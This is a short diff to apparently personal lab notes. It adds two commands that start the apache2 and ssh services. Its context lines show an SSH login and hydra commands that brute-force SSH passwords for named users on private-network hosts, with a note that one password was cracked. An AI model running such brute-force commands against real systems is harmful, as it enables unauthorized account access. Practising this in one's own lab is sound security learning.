@@ -67,6 +67,8 @@ sudo ssh -p 22  administrator@192.168.174.129
 /////now setiing docker 
 
 ///setting hydra brute force 
+service apache2 start
+service ssh start
 ALHAMDULLAH !!!! successfully cracked password using hydra
 hydra -l administrator -P password.txt -T 20 192.168.174.129 ssh
 hydra -l sajib -P password.txt -T 20 192.168.174.128  ssh
